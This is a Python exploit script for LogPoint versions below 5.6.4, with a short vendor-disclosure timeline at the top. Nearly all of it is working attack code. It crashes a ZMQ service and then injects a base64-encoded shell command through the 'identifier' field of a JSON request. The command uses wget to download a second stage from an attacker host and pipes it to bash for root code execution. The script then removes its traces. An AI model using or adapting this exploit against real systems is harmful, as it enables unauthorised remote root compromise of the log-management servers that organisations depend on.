# Date: 11/06/17
# Exploit Author: agix
# Vendor Homepage: https://www.logpoint.com
# Version: logpoint < 5.6.4
# Tested on: 5.6.2
 
# Vendor contact 19/04
# Exploit details sent to the vendor 24/04
# Patch in test mode 05/05
# Patch release to public 08/05
 
 
# run python -m SimpleHTTPServer to serve second stage of the exploit in a file named e
# to get root code execution this is the second stage e
# it downloads a third stage executed as root
 
import time
import zmq
import sys
import json
import random
import string
import base64
 
ATTACKER_IP = &#039;172.16.171.1&#039;
LOGPOINT_IP = &#039;172.16.171.204&#039;
 
def crash():
    context = zmq.Context()
    sock = context.socket(zmq.DEALER)
    sock.connect("tcp://%s:5504"%LOGPOINT_IP)
    sock.send(&#039;crash&#039;)
 
crash()
time.sleep(1)
 
context = zmq.Context()
 
sock2 = context.socket(zmq.DEALER)
sock2.connect("tcp://%s:5504"%LOGPOINT_IP)
 
name = &#039;&#039;.join(random.choice(string.ascii_uppercase) for _ in range(6))
 
cmd1 = base64.b64encode(&#039;wget http://%s:8000/e -O /tmp/e&#039;%ATTACKER_IP)
cmd2 = base64.b64encode(&#039;cat /tmp/e&#039;)
 
exploit = &#039;%s"; $(echo -n %s | base64 -d) && $(echo -n %s | base64 -d) | bash ; echo "test&#039;%(name, cmd1, cmd2)
 
tosend = json.dumps({"request_id": name, "query": "high_availability", "query_info": {"store_front_port": 5500, "action": "add", "ip": ATTACKER_IP, "days": 12, "repo_name": name, "identifier": exploit}})
print tosend
sock2.send(tosend)
print sock2.recv()
 
time.sleep(30)
 
# cleaning
tosend = json.dumps({"request_id": name+"-1", "query": "high_availability", "query_info": {"store_front_port": 5500, "action": "delete", "ip": ATTACKER_IP, "days": 12, "repo_name": name, "identifier": exploit}})
print tosend
sock2.send(tosend)
print sock2.recv()

